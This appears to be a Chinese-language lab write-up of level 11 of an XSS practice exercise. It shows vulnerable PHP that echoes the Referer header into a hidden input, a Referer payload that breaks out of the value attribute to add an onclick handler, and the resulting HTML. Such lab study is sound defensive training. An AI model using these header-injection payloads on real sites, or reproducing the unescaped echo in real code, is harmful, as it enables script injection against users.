# Level 11 — Referer 头注入

## 发现过程

打开页面没输入框，URL 加参数没反应。看源码发现 `t_ref` 参数，值是从 Referer 头读的。

## 源码关键部分

```php
$str = $_SERVER['HTTP_REFERER'];
// 删了 < >
echo '<input name="t_ref" value="'.$str.'" type="hidden">';
```

## Payload

Burp 截请求，把 Referer 头改成：

```
Referer: " onclick="alert(1)" type="text"
```
![](99_Attachments/图片/level11/file-20260622195551211.png)

![](99_Attachments/图片/level11/file-20260622195608189.png)

拼进 HTML 后 type 属性写两遍，浏览器取前面那个：

```html
<input name="t_ref" value="" onclick="alert(1)" type="text"" type="hidden">
```

## 要点

- 注入点不一定是 GET 参数，Header 也是攻击面
- hidden 不是死局，type 属性双写覆盖
